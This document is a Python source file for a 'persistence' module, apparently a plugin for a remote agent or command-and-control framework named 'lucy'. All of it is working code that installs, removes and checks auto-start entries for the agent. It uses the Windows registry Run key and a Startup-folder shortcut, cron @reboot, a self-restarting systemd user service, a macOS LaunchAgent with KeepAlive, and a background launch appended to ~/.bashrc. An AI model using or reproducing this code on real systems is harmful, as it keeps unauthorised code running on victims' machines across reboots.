NAME = "persistence"
VERSION = "1.0.0"
DESCRIPTION = "Install/remove agent persistence via startup folder, registry, cron, launchd."
AUTHOR = "lucy"
DEPENDENCIES = []
OS_COMPAT = ["windows", "linux", "darwin"]


import os
import platform
import subprocess
import sys


class ModuleError(Exception):
    pass


def run(action: str, params: dict) -> dict:
    method = params.get("method", "auto")
    target = params.get("target", sys.executable)
    name = params.get("name", "lucy_agent")

    if action == "install":
        return _install(method, target, name)
    elif action == "remove":
        return _remove(method, name)
    elif action == "check":
        return _check(method, name)
    return {"status": "failed", "data": None, "error": f"Unknown action: {action}"}


def _install(method: str, target: str, name: str) -> dict:
    system = platform.system()

    if method == "auto":
        if system == "Windows":
            method = "registry"
        elif system == "Darwin":
            method = "launchd"
        else:
            method = "cron"

    if method == "registry":
        return _windows_registry(target, name, install=True)
    elif method == "startup_folder":
        return _windows_startup(target, name, install=True)
    elif method == "cron":
        return _linux_cron(target, name, install=True)
    elif method == "systemd":
        return _linux_systemd(target, name, install=True)
    elif method == "launchd":
        return _macos_launchd(target, name, install=True)
    elif method == "bashrc":
        return _linux_bashrc(target, name, install=True)

    return {"status": "failed", "data": None, "error": f"Unknown persistence method: {method}"}


def _remove(method: str, name: str) -> dict:
    system = platform.system()
    if method == "auto":
        method = "registry" if system == "Windows" else ("launchd" if system == "Darwin" else "cron")

    target = ""
    if method == "registry":
        return _windows_registry(target, name, install=False)
    elif method == "startup_folder":
        return _windows_startup(target, name, install=False)
    elif method == "cron":
        return _linux_cron(target, name, install=False)
    elif method == "systemd":
        return _linux_systemd(target, name, install=False)
    elif method == "launchd":
        return _macos_launchd(target, name, install=False)
    elif method == "bashrc":
        return _linux_bashrc(target, name, install=False)
    return {"status": "failed", "data": None, "error": f"Unknown method: {method}"}


def _check(method: str, name: str) -> dict:
    system = platform.system()
    installed = False
    if system == "Windows":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
            winreg.QueryValueEx(key, name)
            installed = True
        except Exception:
            pass
    elif system == "Linux":
        try:
            out = subprocess.check_output(["crontab", "-l"], text=True, timeout=5, stderr=subprocess.DEVNULL)
            installed = name in out
        except Exception:
            pass
    elif system == "Darwin":
        plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{name}.plist")
        installed = os.path.exists(plist_path)
    return {"status": "completed", "data": {"installed": installed, "method": method, "name": name}}


def _windows_registry(target: str, name: str, install: bool) -> dict:
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE,
        )
        if install:
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{target}"')
            return {"status": "completed", "data": {"installed": True, "method": "registry", "name": name}}
        else:
            winreg.DeleteValue(key, name)
            return {"status": "completed", "data": {"removed": True}}
    except Exception as exc:
        return {"status": "failed", "data": None, "error": str(exc)}


def _windows_startup(target: str, name: str, install: bool) -> dict:
    try:
        startup = os.path.join(
            os.environ.get("APPDATA", ""),
            r"Microsoft\Windows\Start Menu\Programs\Startup",
        )
        lnk_path = os.path.join(startup, f"{name}.lnk")
        if install:
            import win32com.client
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(lnk_path)
            shortcut.Targetpath = target
            shortcut.save()
            return {"status": "completed", "data": {"installed": True, "path": lnk_path}}
        else:
            if os.path.exists(lnk_path):
                os.unlink(lnk_path)
            return {"status": "completed", "data": {"removed": True}}
    except Exception as exc:
        return {"status": "failed", "data": None, "error": str(exc)}


def _linux_cron(target: str, name: str, install: bool) -> dict:
    try:
        existing = ""
        try:
            existing = subprocess.check_output(["crontab", "-l"], text=True, timeout=5, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            pass

        marker = f"# lucy:{name}"
        lines = [l for l in existing.splitlines() if marker not in l and l.strip()]

        if install:
            lines.append(f"@reboot {target}  {marker}")
            new_cron = "\n".join(lines) + "\n"
            p = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
            p.communicate(new_cron, timeout=5)
            return {"status": "completed", "data": {"installed": True, "method": "cron"}}
        else:
            new_cron = "\n".join(lines) + "\n"
            p = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
            p.communicate(new_cron, timeout=5)
            return {"status": "completed", "data": {"removed": True}}
    except Exception as exc:
        return {"status": "failed", "data": None, "error": str(exc)}


def _linux_systemd(target: str, name: str, install: bool) -> dict:
    service_dir = os.path.expanduser("~/.config/systemd/user")
    service_path = os.path.join(service_dir, f"{name}.service")
    try:
        if install:
            os.makedirs(service_dir, exist_ok=True)
            unit = f"""[Unit]
Description=Lucy Agent
After=network.target

[Service]
ExecStart={target}
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
"""
            with open(service_path, "w") as f:
                f.write(unit)
            subprocess.run(["systemctl", "--user", "daemon-reload"], timeout=5)
            subprocess.run(["systemctl", "--user", "enable", f"{name}.service"], timeout=5)
            return {"status": "completed", "data": {"installed": True, "path": service_path}}
        else:
            subprocess.run(["systemctl", "--user", "disable", f"{name}.service"], timeout=5)
            if os.path.exists(service_path):
                os.unlink(service_path)
            return {"status": "completed", "data": {"removed": True}}
    except Exception as exc:
        return {"status": "failed", "data": None, "error": str(exc)}


def _macos_launchd(target: str, name: str, install: bool) -> dict:
    plist_dir = os.path.expanduser("~/Library/LaunchAgents")
    plist_path = os.path.join(plist_dir, f"{name}.plist")
    try:
        if install:
            os.makedirs(plist_dir, exist_ok=True)
            plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>{name}</string>
    <key>ProgramArguments</key><array><string>{target}</string></array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
</dict>
</plist>"""
            with open(plist_path, "w") as f:
                f.write(plist)
            subprocess.run(["launchctl", "load", plist_path], timeout=5)
            return {"status": "completed", "data": {"installed": True, "path": plist_path}}
        else:
            subprocess.run(["launchctl", "unload", plist_path], timeout=5)
            if os.path.exists(plist_path):
                os.unlink(plist_path)
            return {"status": "completed", "data": {"removed": True}}
    except Exception as exc:
        return {"status": "failed", "data": None, "error": str(exc)}


def _linux_bashrc(target: str, name: str, install: bool) -> dict:
    bashrc = os.path.expanduser("~/.bashrc")
    marker = f"# lucy:{name}"
    try:
        existing = ""
        if os.path.exists(bashrc):
            with open(bashrc, "r") as f:
                existing = f.read()
        lines = [l for l in existing.splitlines() if marker not in l]
        if install:
            lines.append(f"({target} &)  {marker}")
        with open(bashrc, "w") as f:
            f.write("\n".join(lines) + "\n")
        return {"status": "completed", "data": {"installed": install, "method": "bashrc"}}
    except Exception as exc:
        return {"status": "failed", "data": None, "error": str(exc)}
